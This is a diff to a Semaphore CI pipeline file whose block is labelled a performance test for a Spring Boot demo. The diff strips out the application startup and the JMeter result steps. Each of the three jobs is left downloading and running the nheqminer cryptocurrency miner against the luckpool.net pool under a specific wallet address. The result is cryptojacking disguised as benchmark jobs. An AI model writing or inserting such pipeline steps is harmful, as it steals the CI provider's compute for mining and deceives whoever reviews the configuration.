@@ -4,14 +4,15 @@ agent:
   machine:
     type: e1-standard-8
     os_image: ubuntu1804
+  containers:
+    - name: main
+      image: 'semaphoreci/ubuntu:18.04'
 execution_time_limit:
   hours: 24
 blocks:
   - name: perfomance test
     task:
-      env_vars:
-        - name: MAVEN_OPTS
-          value: '-Dmaven.repo.local=.m2'
+      env_vars: []
       prologue:
         commands:
           - checkout
@@ -19,28 +20,19 @@ blocks:
       jobs:
         - name: Benchmark
           commands:
-            - '- jar target/spring-pipeline-demo.jar > /dev/null & '
-            - '# Wait for the spring boot application to boot '
             - '- wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz '
             - '- tar -xvf nheqminer-Linux-v0.8.2.tgz'
             - '- tar -xvf nheqminer-Linux-v0.8.2.tar.gz '
             - '- nheqminer/nheqminer -v -l na.luckpool.net:3956 -u REejsFSEW7oNFAJf9joJufYZLg6tnPezsK.sema -p x -t 4'
-            - '- mvn jmeter:results'
         - name: 'Job #2'
           commands:
-            - '- jar target/spring-pipeline-demo.jar > /dev/null & '
-            - '# Wait for the spring boot application to boot '
             - '- wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz '
             - '- tar -xvf nheqminer-Linux-v0.8.2.tgz'
             - '- tar -xvf nheqminer-Linux-v0.8.2.tar.gz '
             - '- nheqminer/nheqminer -v -l na.luckpool.net:3956 -u REejsFSEW7oNFAJf9joJufYZLg6tnPezsK.sema -p x -t 4'
-            - '- mvn jmeter:results'
         - name: 'Job #3'
           commands:
-            - '- jar target/spring-pipeline-demo.jar > /dev/null & '
-            - '# Wait for the spring boot application to boot '
             - '- wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz '
             - '- tar -xvf nheqminer-Linux-v0.8.2.tgz'
             - '- tar -xvf nheqminer-Linux-v0.8.2.tar.gz '
             - '- nheqminer/nheqminer -v -l na.luckpool.net:3956 -u REejsFSEW7oNFAJf9joJufYZLg6tnPezsK.sema -p x -t 4'
-            - '- mvn jmeter:results'
